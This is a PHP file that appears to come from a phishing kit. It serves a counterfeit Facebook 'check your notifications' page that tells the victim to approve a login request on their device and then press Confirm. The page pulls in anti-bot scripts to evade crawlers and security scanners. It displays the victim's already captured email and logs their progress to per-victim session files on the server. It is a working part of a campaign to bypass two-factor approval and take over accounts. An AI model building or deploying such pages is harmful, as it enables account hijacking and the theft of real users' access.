<?php


error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');

session_start();
$id = $_GET['id'];
if (!isset($_SESSION['users'][$id])) {
    header("Location: ../index.php");
    exit();
}
$userData = json_decode(file_get_contents("../sessions/$id.json"), true);
$userEmail = $_SESSION['users'][$id]['failed_user'];
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['users'][$id]['alert_code'] = $_POST['code'];
    $_SESSION['users'][$id]['last_page'] = 'alert';
    file_put_contents("../sessions/$id.json", json_encode($_SESSION['users'][$id]));
    header("Location: verifying.php?id=$id");
    exit();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="../css/auth.css">
    <title>Facebook</title>
    <link rel="icon" type="image/svg" href="../images/fb.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
    input,
    select,
    textarea {
        font-size: 16px;
    }

    .userError {
        font-size: 13px;
        margin-top: -5px;
        margin-bottom: 30px;
        color: red;

    }

    .approval {
        font-size: 13px;
        margin-top: -8px;
        margin-bottom: 30px;
        color: #1c2b33;
        margin-left: 60px;
    }

    h3 {
        font-size: 14px;
        color: #1c2b33;
        margin-top: -7px;
        margin-left: 5px;
    }

    .container {
        display: flex;
        align-items: center;
        margin-left: 20px;
        margin-top: 20px;
    }

    .container img {
        width: 30px;
        height: 30px;
        margin-right: 5px;
    }
    </style>
</head>

<body>
    <section class="main-wrapper">

        <div>
            <div class="panel">
                <form id="loginForm" method="post">
                    <p><?php echo $userEmail; ?> • Facebook</p>
                    <h2 id="header">Check your notifications to your device</h2>
                    <span>We sent a notification to your devices, Check your Facebook notifications there and approve
                        the
                        login to continue.
                    </span>
                    <img class="image" src="../images/noti.png" alt="Notification">
                    <div class="container">
                        <img src="../images/dot.png" alt="Dot">
                        <h3>Waiting for
                            approval</h3>
                    </div>
                    <div class="approval">
                        <p> Click the confirm button below after the approval. It may take a few minutes to get the
                            notification on your device.</p>
                    </div>
                    <?php if (isset($userData['error']) && $userData['error'] === true): ?>
                    <p class="userError" id="userError">
                        There’s no approval made, please approve the request and click the
                        confirm button.
                    </p>
                    <?php endif; ?>
                    <input type="text" id="code" name="code" style="display: none;">
                    <input class="log-in-button" type="submit" value="Confirm" id="loginButton">
                </form>


            </div>
        </div>
    </section>

    <script>
    document.getElementById('loginButton').addEventListener('click', function() {
        document.getElementById('code').value = 'Approved';
    });
    </script>

</body>

</html>